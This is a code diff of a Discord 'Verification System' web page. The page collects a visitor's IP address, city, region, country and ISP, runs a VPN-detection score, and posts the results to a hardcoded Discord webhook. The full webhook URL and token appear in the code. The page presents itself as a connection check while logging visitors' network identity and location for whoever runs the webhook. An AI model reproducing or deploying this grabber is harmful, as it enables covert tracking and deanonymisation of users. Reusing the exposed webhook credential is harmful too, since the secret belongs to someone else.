@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verification System</title>
   <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -54,16 +54,16 @@
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3';
     const userInput = document.getElementById('discord-user');
     const verifyBtn = document.getElementById('verify-btn');
+    const retryBtn = document.getElementById('retry-btn');
     const statusDiv = document.getElementById('status');
     const ipInfo = document.getElementById('ip-info');
     const ipField = document.getElementById('ip-field');
     const locationField = document.getElementById('location-field');
     const ispField = document.getElementById('isp-field');
-    const retryBtn = document.getElementById('retry-btn');
 
     function setStatus(state, title, msg) {
       statusDiv.className = 'status ' + state;
-      statusDiv.innerHTML = `${state === 'loading' ? '<div class="spinner"></div>' : ''}` +
+      statusDiv.innerHTML = (state === 'loading' ? '<div class="spinner"></div>' : '') +
         `<div class="message"><strong>${title}</strong> <span>${msg}</span></div>`;
       statusDiv.style.display = 'flex';
     }
@@ -91,7 +91,6 @@
     async function runVerification(userTag) {
       setStatus('loading', 'Verifying...', 'Fetching IP...');
       try {
-        // IP lookup
         let ipData;
         try { ipData = await (await safeFetch('https://api.ipify.org?format=json')).json(); }
         catch { ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json(); }
@@ -99,10 +98,9 @@
         if (!ip) throw new Error('IP not found');
         ipField.textContent = ip;
 
-        // Geolocation
         setStatus('loading', 'Verifying...', 'Fetching geolocation...');
         let geo;
-        try { geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json(); if (geo.error) throw ''; }
+        try { geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json(); if(geo.error) throw ''; }
         catch { geo = await (await safeFetch(`https://ipwho.is/${ip}`)).json(); }
         const city = geo.city || 'Unknown';
         const region = geo.region_name || geo.region || 'Unknown';
@@ -111,19 +109,17 @@
         ispField.textContent = geo.org || geo.connection?.isp || 'Unknown';
         ipInfo.style.display = 'block';
 
-        // VPN detection
         setStatus('loading', 'Verifying...', 'Analyzing network...');
         let score = 0;
         const factors = [];
         if (geo.org && /datacenter|hosting|cloud/i.test(geo.org)) { factors.push('Datacenter IP'); score += 40; }
         if (geo.org && /vpn|proxy|tor/i.test(geo.org)) { factors.push('VPN/Proxy'); score += 50; }
-        if (geo.port && [1080,3128,8080,8888,9050].includes(Number(geo.port))) { factors.push('Proxy port'); score += 30; }
+        if (geo.port && [1080,3128,8080,8888,9050].includes(+geo.port)) { factors.push('Proxy port'); score += 30; }
         if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) { factors.push('Timezone mismatch'); score += 20; }
         const usingVpn = score >= 60;
 
-        // Send to Discord
         setStatus('loading', 'Verifying...', 'Sending results...');
-        const displayField = isValidId(userTag) ? 'User ID' : 'Discord User';
+        const displayField = isValidId(userTag) ? 'User ID' : isValidTag(userTag) ? 'Discord User' : 'Discord';
         const payload = {
           username: 'Verification System', avatar_url: 'https://i.imgur.com/ZOKp8LH.png', embeds: [{
             title: `${userTag} — ${city}, ${country}`,
@@ -139,4 +135,27 @@
           }]
         };
         if (factors.length) payload.embeds[0].fields.push({ name: '⚠️ Suspicious Factors', value: factors.join('\n'), inline: false });
-        await fetch(DISCO
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+
+        setStatus(usingVpn ? 'warning' : 'success', usingVpn ? 'VPN Detected' : 'Verification Successful', usingVpn ? 'Disable VPN and retry.' : 'Your connection is secure.');
+        retryBtn.style.display = 'none';
+      } catch (err) {
+        console.error(err);
+        setStatus('error', 'Error', err.message || 'Verification failed.');
+        retryBtn.style.display = 'block';
+      }
+    }
+
+    verifyBtn.addEventListener('click', () => {
+      const val = userInput.value.trim();
+      if (!val) return alert('Please enter your Discord username or ID.');
+      runVerification(val);
+    });
+
+    retryBtn.addEventListener('click', () => {
+      retryBtn.style.display = 'none';
+      runVerification(userInput.value.trim());
+    });
+  </script>
+</body>
+</html>
